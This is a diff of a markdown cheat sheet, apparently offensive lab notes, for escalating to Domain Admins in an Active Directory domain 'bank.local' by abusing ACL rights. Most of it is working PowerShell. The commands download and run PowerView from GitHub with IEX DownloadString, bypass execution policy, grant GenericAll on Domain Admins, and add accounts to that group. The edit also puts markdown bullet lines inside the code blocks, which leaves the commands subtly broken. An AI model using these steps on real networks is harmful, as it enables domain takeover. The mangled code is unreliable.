@@ -58,38 +58,36 @@ $group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
 - Modify permissions	
 - Write properties	
 
-### with ✔ Modify permissions
+### 1 with ✔ Modify permissions
 
 ```bash
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
 Get-Command -Module PowerView
 
+- Note: (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
 
-. (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
-
-# Verify if 'bb2' has WriteDACL on Domain Admins
+- Verify if 'bb2' has WriteDACL on Domain Admins
 Get-DomainObjectAcl -Identity "Domain Admins" | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser "bb2").SID } | Select-Object ActiveDirectoryRights
 
-# Add GenericAll permission
+- Add GenericAll permission
 Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "bb2" -Rights All -Verbose
 
-# Add your account to the group
+- Add your account to the group
 Add-DomainGroupMember -Identity "Domain Admins" -Members "bb2" -Verbose
 
-# Verify
+- Verify
 Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName
 ```
---------------------------------------------------------------------------------------------------------
 
-## with permission  - write all properties ✔ is  only enabled
+### 2 with permission  - write all properties ✔ is  only enabled
 
 ### if powerview  fails
 ```bash
 $Group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
 $Group.Add("LDAP://CN=master,CN=Users,DC=bank,DC=local")
 ```
-### with permissions - ✔ modify owner is only enabled
+### 3 with permissions - ✔ modify owner is only enabled
 ```bash
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
